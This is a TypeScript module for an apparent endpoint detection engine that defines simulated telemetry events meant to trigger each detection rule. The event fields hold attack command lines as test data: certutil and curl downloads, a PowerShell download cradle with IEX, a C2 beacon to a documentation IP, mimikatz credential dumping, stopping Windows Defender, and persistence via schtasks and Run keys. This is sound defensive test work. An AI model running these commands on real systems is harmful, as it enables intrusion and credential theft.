import crypto from 'node:crypto';
import { 
  ingestAndDetect, 
  evaluateTelemetryEvent,
  syncDefaultRules,
  getRules 
} from '../backend/detection/engine.js';
import { 
  TelemetryEvent, 
  AlertRecord, 
  DetectionRule 
} from '../backend/detection/types.js';

export type { TelemetryEvent, AlertRecord, DetectionRule };

export interface IngestResult {
  eventId: number;
  alertsGenerated: AlertRecord[];
}

/**
 * Ingests a telemetry event, persists to SQLite, and evaluates against real detection rules
 */
export function ingestTelemetry(event: TelemetryEvent): IngestResult {
  return ingestAndDetect(event);
}

/**
 * Safe Simulation definitions
 * Non-harmful, safe test events to verify detection coverage across all rule types.
 * Each simulation tests a specific detection requirement.
 */
export const SAFE_SIMULATIONS = [
  {
    id: 'SIM-OFFICE-POWERSHELL',
    name: 'PowerShell Spawned by Microsoft Office',
    technique: 'T1059.001 - PowerShell / T1204.002',
    description: 'Simulates Microsoft Word (winword.exe) spawning powershell.exe, typical of malicious document macro execution or exploit staging.',
    targetRule: 'EDR-001-OFFICE-POWERSHELL',
    createEvent: (): TelemetryEvent => ({
      event_type: 'process_creation',
      process_name: 'powershell.exe',
      process_id: Math.floor(2000 + Math.random() * 8000),
      parent_process_id: 5612,
      parent_process_name: 'winword.exe',
      parent_command_line: '"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" "C:\\Users\\User\\Downloads\\Invoice.docm"',
      command_line: 'powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -enc V3JpdGUtSG9zdCAnU2FmZSBPZmZpY2UgTWFjcm8gVGVzdCc=',
      user: 'WIN-LAPTOP\\User',
      image_path: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
      file_hash: '2e8964724896e00b84c8a245f8e582d92d8f9cbe878b274c3e8ff17865c32890',
      source: 'safe_simulator'
    })
  },
  {
    id: 'SIM-CMD-UNUSUAL-PARENT',
    name: 'cmd.exe Spawned by Unusual Parent (Web Browser)',
    technique: 'T1059.003 - Windows Command Shell',
    description: 'Simulates Google Chrome spawning cmd.exe directly, an abnormal lineage indicating browser exploit or remote code execution.',
    targetRule: 'EDR-002-CMD-UNUSUAL-PARENT',
    createEvent: (): TelemetryEvent => ({
      event_type: 'process_creation',
      process_name: 'cmd.exe',
      process_id: Math.floor(2000 + Math.random() * 8000),
      parent_process_id: 2840,
      parent_process_name: 'chrome.exe',
      parent_command_line: '"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" --profile-directory="Default"',
      command_line: 'cmd.exe /c whoami',
      user: 'WIN-LAPTOP\\User',
      image_path: 'C:\\Windows\\System32\\cmd.exe',
      file_hash: 'f1923c5d8e7f2a1b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b',
      source: 'safe_simulator'
    })
  },
  {
    id: 'SIM-TEMP-DIR-EXEC',
    name: 'Executable Launched from Temporary Directory',
    technique: 'T1027 - Obfuscated Files or Information',
    description: 'Simulates execution of an executable payload directly from AppData\\Local\\Temp, standard malware staging directory.',
    targetRule: 'EDR-003-EXE-FROM-TEMP-DIR',
    createEvent: (): TelemetryEvent => ({
      event_type: 'process_creation',
      process_name: 'payload_installer.exe',
      process_id: Math.floor(2000 + Math.random() * 8000),
      parent_process_id: 4112,
      parent_process_name: 'cmd.exe',
      parent_command_line: 'cmd.exe',
      command_line: '"C:\\Users\\User\\AppData\\Local\\Temp\\payload_installer.exe" --silent',
      user: 'WIN-LAPTOP\\User',
      image_path: 'C:\\Users\\User\\AppData\\Local\\Temp\\payload_installer.exe',
      file_hash: 'e4b13c5d8e7f2a1b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b',
      source: 'safe_simulator'
    })
  },
  {
    id: 'SIM-LOLBIN-CERTUTIL',
    name: 'Suspicious LOLBin Execution (CertUtil Download)',
    technique: 'T1105 - Ingress Tool Transfer / T1218',
    description: 'Simulates LOLBin abuse of certutil.exe with -urlcache and -split parameters attempting file download from test URI.',
    targetRule: 'EDR-004-SUSPICIOUS-LOLBIN-EXEC',
    createEvent: (): TelemetryEvent => ({
      event_type: 'process_creation',
      process_name: 'certutil.exe',
      process_id: Math.floor(2000 + Math.random() * 8000),
      parent_process_id: 4112,
      parent_process_name: 'cmd.exe',
      parent_command_line: 'cmd.exe',
      command_line: 'certutil.exe -urlcache -split -f https://testing.local/payload.bin C:\\Users\\Public\\test.bin',
      user: 'WIN-LAPTOP\\User',
      image_path: 'C:\\Windows\\System32\\certutil.exe',
      file_hash: '3a41b52f9c9b1395f5dc431a4773de90c2975850ab89e0ee25be326c9533f86e',
      source: 'safe_simulator'
    })
  },
  {
    id: 'SIM-UNSIGNED-EXE-PARENT',
    name: 'Unsigned Executable Spawned by Suspicious Parent',
    technique: 'T1036 - Masquerading',
    description: 'Simulates PowerShell spawning an unsigned, unverified binary (signature_status = Unsigned), indicating script-dropped tool execution.',
    targetRule: 'EDR-005-UNSIGNED-EXE-SUSPICIOUS-PARENT',
    createEvent: (): TelemetryEvent => ({
      event_type: 'process_creation',
      process_name: 'custom_loader.exe',
      process_id: Math.floor(2000 + Math.random() * 8000),
      parent_process_id: 4820,
      parent_process_name: 'powershell.exe',
      parent_command_line: 'powershell.exe -NoLogo',
      command_line: '"C:\\Tools\\custom_loader.exe" /run',
      user: 'WIN-LAPTOP\\User',
      image_path: 'C:\\Tools\\custom_loader.exe',
      signature_status: 'Unsigned',
      file_hash: 'c8914c8996fb92427ae41e4649b934ca495991b7852b855e3b0c44298fc1c1a3',
      source: 'safe_simulator'
    })
  },
  {
    id: 'SIM-KNOWN-MALICIOUS-HASH',
    name: 'Threat Intel Match: Known Malicious Hash',
    technique: 'T1204.002 - Malicious File Execution',
    description: 'Simulates process execution whose file hash matches a known malicious IoC recorded in the Threat Intelligence catalog.',
    targetRule: 'EDR-006-KNOWN-MALICIOUS-HASH',
    createEvent: (): TelemetryEvent => ({
      event_type: 'process_creation',
      process_name: 'mimikatz.exe',
      process_id: Math.floor(2000 + Math.random() * 8000),
      parent_process_id: 4112,
      parent_process_name: 'cmd.exe',
      command_line: 'mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit',
      user: 'WIN-LAPTOP\\LocalAdmin',
      image_path: 'C:\\Windows\\Temp\\mimikatz.exe',
      file_hash: 'a3f12e8964724896e00b84c8a245f8e582d92d8f9cbe878b274c3e8ff17865c3',
      source: 'safe_simulator'
    })
  },
  {
    id: 'SIM-POWERSHELL-ENCODED',
    name: 'PowerShell Encoded Command Execution',
    technique: 'T1059.001 - PowerShell',
    description: 'Simulates powershell.exe invoking a base64 encoded command string to evade command-line inspection.',
    targetRule: 'EDR-007-POWERSHELL-ENCODED',
    createEvent: (): TelemetryEvent => ({
      event_type: 'process_creation',
      process_name: 'powershell.exe',
      process_id: Math.floor(2000 + Math.random() * 8000),
      parent_process_id: 1120,
      parent_process_name: 'explorer.exe',
      command_line: 'powershell.exe -NoProfile -ExecutionPolicy Bypass -enc V3JpdGUtSG9zdCAnTG9jYWxFRFIgRW5jb2RlZCBDb21tYW5kJw==',
      user: 'WIN-LAPTOP\\User',
      image_path: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
      file_hash: 'b8173c5d8e7f2a1b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b',
      source: 'safe_simulator'
    })
  },
  {
    id: 'SIM-SUSPICIOUS-USERNAME-SHELL',
    name: 'Suspicious User Account Spawning Shell',
    technique: 'T1078 - Valid Accounts',
    description: 'Simulates restricted Guest user account spawning cmd.exe, testing user principal condition matching.',
    targetRule: 'EDR-008-SUSPICIOUS-USERNAME-SHELL',
    createEvent: (): TelemetryEvent => ({
      event_type: 'process_creation',
      process_name: 'cmd.exe',
      process_id: Math.floor(2000 + Math.random() * 8000),
      parent_process_id: 1120,
      parent_process_name: 'explorer.exe',
      command_line: 'cmd.exe /k net user',
      user: 'WIN-LAPTOP\\Guest',
      image_path: 'C:\\Windows\\System32\\cmd.exe',
      file_hash: 'f1923c5d8e7f2a1b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b',
      source: 'safe_simulator'
    })
  },
  {
    id: 'SIM-SCHEDULED-TASK',
    name: 'Scheduled Task Creation (schtasks /create)',
    technique: 'T1053.005 - Scheduled Task',
    description: 'Simulates creation of a Windows scheduled task via schtasks.exe for persistence or lateral movement.',
    targetRule: 'EDR-010-SCHEDULED-TASK-PERSISTENCE',
    createEvent: (): TelemetryEvent => ({
      event_type: 'process_creation',
      process_name: 'schtasks.exe',
      process_id: Math.floor(2000 + Math.random() * 8000),
      parent_process_id: 1120,
      parent_process_name: 'cmd.exe',
      command_line: 'schtasks.exe /create /tn "SecuritySync" /tr "C:\\Users\\Public\\update.exe" /sc onlogon /ru SYSTEM',
      user: 'WIN-LAPTOP\\Administrator',
      image_path: 'C:\\Windows\\System32\\schtasks.exe',
      file_hash: '9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d3e2f1a0b9c8d7e6f5a4b3c2d1e0f9a8b',
      source: 'safe_simulator'
    })
  },
  {
    id: 'SIM-REGISTRY-RUN-KEY',
    name: 'Registry Run Key Persistence',
    technique: 'T1547.001 - Registry Run Keys',
    description: 'Simulates reg.exe adding an autostart entry under CurrentVersion\\Run for persistent payload execution.',
    targetRule: 'EDR-011-REGISTRY-RUN-KEY-PERSISTENCE',
    createEvent: (): TelemetryEvent => ({
      event_type: 'process_creation',
      process_name: 'reg.exe',
      process_id: Math.floor(2000 + Math.random() * 8000),
      parent_process_id: 2840,
      parent_process_name: 'cmd.exe',
      command_line: 'reg.exe add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "EdgeUpdater" /t REG_SZ /d "C:\\Users\\Public\\updater.exe" /f',
      user: 'WIN-LAPTOP\\User',
      image_path: 'C:\\Windows\\System32\\reg.exe',
      registry_key: 'HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\EdgeUpdater',
      file_hash: '8f7e6d5c4b3a2f1e0d9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0b9a8f7e',
      source: 'safe_simulator'
    })
  },
  {
    id: 'SIM-INGRESS-TOOL-TRANSFER',
    name: 'Ingress Tool Transfer (curl download)',
    technique: 'T1105 - Ingress Tool Transfer',
    description: 'Simulates curl.exe downloading an executable binary payload from a remote staging server.',
    targetRule: 'EDR-012-INGRESS-TOOL-TRANSFER',
    createEvent: (): TelemetryEvent => ({
      event_type: 'process_creation',
      process_name: 'curl.exe',
      process_id: Math.floor(2000 + Math.random() * 8000),
      parent_process_id: 1120,
      parent_process_name: 'cmd.exe',
      command_line: 'curl.exe -o C:\\Users\\Public\\stager.exe http://198.51.100.22/stager.exe',
      user: 'WIN-LAPTOP\\User',
      destination_ip: '198.51.100.22',
      destination_port: 80,
      image_path: 'C:\\Windows\\System32\\curl.exe',
      file_hash: '7e6d5c4b3a2f1e0d9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0b9a8f7e6d',
      source: 'safe_simulator'
    })
  },
  {
    id: 'SIM-APP-LAYER-C2',
    name: 'Application Layer Protocol C2 Beacon',
    technique: 'T1071.001 - Web Protocols',
    description: 'Simulates outbound beacon traffic across non-standard port 8080 representing active C2 interaction.',
    targetRule: 'EDR-013-APPLICATION-LAYER-C2',
    createEvent: (): TelemetryEvent => ({
      event_type: 'process_creation',
      process_name: 'powershell.exe',
      process_id: Math.floor(2000 + Math.random() * 8000),
      parent_process_id: 1120,
      parent_process_name: 'cmd.exe',
      command_line: 'powershell.exe -w hidden -c "Invoke-RestMethod -Uri http://203.0.113.5:8080/c2_beacon -Method POST"',
      user: 'WIN-LAPTOP\\User',
      destination_ip: '203.0.113.5',
      destination_port: 8080,
      image_path: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
      file_hash: '6d5c4b3a2f1e0d9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0b9a8f7e6d5c',
      source: 'safe_simulator'
    })
  },
  {
    id: 'SIM-DISABLE-DEFENDER',
    name: 'Impair Defenses: Stop WinDefend Service',
    technique: 'T1562.001 - Disable or Modify Tools',
    description: 'Simulates adversary attempt to stop Windows Defender Antivirus via sc.exe, testing defense impairment detection.',
    targetRule: 'EDR-014-DISABLE-WINDOWS-DEFENDER',
    createEvent: (): TelemetryEvent => ({
      event_type: 'process_creation',
      process_name: 'sc.exe',
      process_id: Math.floor(2000 + Math.random() * 8000),
      parent_process_id: 1120,
      parent_process_name: 'cmd.exe',
      command_line: 'sc.exe stop windefend',
      user: 'WIN-LAPTOP\\Administrator',
      image_path: 'C:\\Windows\\System32\\sc.exe',
      file_hash: '5c4b3a2f1e0d9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0b9a8f7e6d5c4b',
      source: 'safe_simulator'
    })
  },
  {
    id: 'SIM-SYSTEM-INFO-DISCOVERY',
    name: 'System Information Discovery',
    technique: 'T1082 - System Information Discovery',
    description: 'Simulates systeminfo.exe collecting hardware, patch, and OS configuration details.',
    targetRule: 'EDR-015-SYSTEM-INFO-DISCOVERY',
    createEvent: (): TelemetryEvent => ({
      event_type: 'process_creation',
      process_name: 'systeminfo.exe',
      process_id: Math.floor(2000 + Math.random() * 8000),
      parent_process_id: 1120,
      parent_process_name: 'cmd.exe',
      command_line: 'systeminfo.exe /fo list',
      user: 'WIN-LAPTOP\\User',
      image_path: 'C:\\Windows\\System32\\systeminfo.exe',
      file_hash: '4b3a2f1e0d9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0b9a8f7e6d5c4b3a',
      source: 'safe_simulator'
    })
  },
  {
    id: 'SIM-BENIGN-NOTEPAD',
    name: 'Benign Standard Application (No Alert Expected)',
    technique: 'Normal Activity - Baseline Verification',
    description: 'Simulates normal user execution of Notepad opening a notes file. Proves the detection engine does NOT false-positive on standard benign activity.',
    targetRule: 'NONE (Should Produce 0 Alerts)',
    createEvent: (): TelemetryEvent => ({
      event_type: 'process_creation',
      process_name: 'notepad.exe',
      process_id: Math.floor(2000 + Math.random() * 8000),
      parent_process_id: 1120,
      parent_process_name: 'explorer.exe',
      command_line: '"C:\\Windows\\System32\\notepad.exe" "C:\\Users\\User\\Documents\\meeting_notes.txt"',
      user: 'WIN-LAPTOP\\User',
      image_path: 'C:\\Windows\\System32\\notepad.exe',
      file_hash: 'e4b13c5d8e7f2a1b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b',
      signature_status: 'Valid',
      publisher: 'Microsoft Windows Publisher',
      source: 'safe_simulator'
    })
  },
  {
    id: 'SIM-WIN-ACCOUNT-CREATED',
    name: 'Windows Security: User Account Created (Event 4720)',
    technique: 'T1136.001 - Create Account: Local Account',
    description: 'Simulates Windows Security Event ID 4720 logging the unauthorized creation of a shadow local user account.',
    targetRule: 'EDR-017-WIN-USER-ACCOUNT-CREATED',
    createEvent: (): TelemetryEvent => ({
      channel: 'Security',
      windows_event_id: 4720,
      event_type: 'account_created',
      event_category: 'windows_event',
      user_name: 'LocalAdmin',
      user_domain: 'WIN-ENDPOINT-01',
      target_user: 'backdoor_admin',
      target_domain: 'WIN-ENDPOINT-01',
      action: 'A user account was created: backdoor_admin',
      message: 'A user account was created. Subject: LocalAdmin, New Account: backdoor_admin',
      source: 'safe_simulator'
    })
  },
  {
    id: 'SIM-WIN-FAILED-LOGON',
    name: 'Windows Security: Failed Remote Logon Attempt (Event 4625)',
    technique: 'T1110.001 - Brute Force: Password Guessing',
    description: 'Simulates Windows Security Event ID 4625 logging repeated failed remote interactive logon attempts (bad password).',
    targetRule: 'EDR-018-WIN-FAILED-LOGON-SPRAY',
    createEvent: (): TelemetryEvent => ({
      channel: 'Security',
      windows_event_id: 4625,
      event_type: 'logon_failure',
      event_category: 'windows_event',
      user_name: 'Administrator',
      user_domain: 'CORP',
      logon_type: 10,
      source_ip: '198.51.100.44',
      source_port: 54122,
      action: 'Failed Remote Logon Attempt',
      message: 'An account failed to log on. Account Name: Administrator, Reason: Bad password (0xC000006A)',
      source: 'safe_simulator'
    })
  },
  {
    id: 'SIM-WIN-SPECIAL-PRIVILEGES',
    name: 'Windows Security: Special Privileges Assigned (Event 4672)',
    technique: 'T1078.003 - Valid Accounts: Local Accounts',
    description: 'Simulates Windows Security Event ID 4672 logging the assignment of SeDebugPrivilege to a newly established session.',
    targetRule: 'EDR-019-WIN-SPECIAL-PRIVILEGES-ASSIGNED',
    createEvent: (): TelemetryEvent => ({
      channel: 'Security',
      windows_event_id: 4672,
      event_type: 'privilege_assigned',
      event_category: 'windows_event',
      user_name: 'ElevatedService',
      user_domain: 'WIN-ENDPOINT-01',
      privilege_list: ['SeDebugPrivilege', 'SeTcbPrivilege', 'SeSecurityPrivilege'],
      action: 'Special Administrative Privileges Assigned to Logon',
      message: 'Special privileges assigned to new logon. Account Name: ElevatedService, Privileges: SeDebugPrivilege',
      source: 'safe_simulator'
    })
  },
  {
    id: 'SIM-WIN-SERVICE-INSTALLED',
    name: 'Windows System: SCM New Service Installed (Event 7045)',
    technique: 'T1543.003 - Windows Service',
    description: 'Simulates Windows System / SCM Event ID 7045 logging the silent installation of a new persistence service binary.',
    targetRule: 'EDR-020-WIN-SERVICE-INSTALLED-SCM',
    createEvent: (): TelemetryEvent => ({
      channel: 'System',
      windows_event_id: 7045,
      event_type: 'service_created',
      event_category: 'windows_event',
      service_name: 'WinDefendUpdateSvc',
      service_file_name: 'C:\\Users\\Public\\malicious_service.exe',
      user_name: 'SYSTEM',
      action: 'New Service Installed: WinDefendUpdateSvc',
      message: 'A service was installed in the system. Service Name: WinDefendUpdateSvc, Service File: C:\\Users\\Public\\malicious_service.exe',
      source: 'safe_simulator'
    })
  },
  {
    id: 'SIM-WIN-SCHEDULED-TASK',
    name: 'Windows Task Scheduler: Task Registered (Event 106)',
    technique: 'T1053.005 - Scheduled Task',
    description: 'Simulates Windows Task Scheduler Event ID 106 logging registration of a persistent task executing PowerShell.',
    targetRule: 'EDR-021-WIN-SCHEDULED-TASK-REGISTERED',
    createEvent: (): TelemetryEvent => ({
      channel: 'Task Scheduler',
      windows_event_id: 106,
      event_type: 'scheduled_task_created',
      event_category: 'windows_event',
      task_name: '\\Microsoft\\Windows\\Maintenance\\DailyReconTask',
      user_name: 'Administrator',
      action: 'Scheduled Task Registered: \\Microsoft\\Windows\\Maintenance\\DailyReconTask',
      message: 'Scheduled Task \\Microsoft\\Windows\\Maintenance\\DailyReconTask registered by Administrator',
      source: 'safe_simulator'
    })
  },
  {
    id: 'SIM-WIN-POWERSHELL-SCRIPTBLOCK',
    name: 'Windows PowerShell: Suspicious ScriptBlock (Event 4104)',
    technique: 'T1059.001 - PowerShell',
    description: 'Simulates Windows PowerShell Event ID 4104 recording execution of an in-memory download cradle script block.',
    targetRule: 'EDR-022-WIN-POWERSHELL-SCRIPTBLOCK',
    createEvent: (): TelemetryEvent => ({
      channel: 'PowerShell',
      windows_event_id: 4104,
      event_type: 'powershell_script_block',
      event_category: 'windows_event',
      user_name: 'User',
      script_text: '$client = New-Object System.Net.WebClient; $payload = $client.DownloadString("http://198.51.100.12/cradle.ps1"); IEX $payload',
      action: 'Suspicious PowerShell ScriptBlock Logging (Download Cradle)',
      message: 'Creating Scriptblock text: $client = New-Object System.Net.WebClient; $payload = $client.DownloadString("http://198.51.100.12/cradle.ps1"); IEX $payload',
      source: 'safe_simulator'
    })
  },
  {
    id: 'SIM-WIN-DEFENDER-DISABLED',
    name: 'Windows Defender: Protection Disabled (Event 5001)',
    technique: 'T1562.001 - Disable or Modify Tools',
    description: 'Simulates Windows Defender Event ID 5001 indicating real-time protection feature has been disabled.',
    targetRule: 'EDR-023-WIN-DEFENDER-PROTECTION-DISABLED',
    createEvent: (): TelemetryEvent => ({
      channel: 'Windows Defender',
      windows_event_id: 5001,
      event_type: 'defender_protection_disabled',
      event_category: 'windows_event',
      user_name: 'SYSTEM',
      action: 'Windows Defender Real-time Protection Disabled',
      message: 'Microsoft Defender Antivirus real-time protection feature has been disabled.',
      source: 'safe_simulator'
    })
  }
];
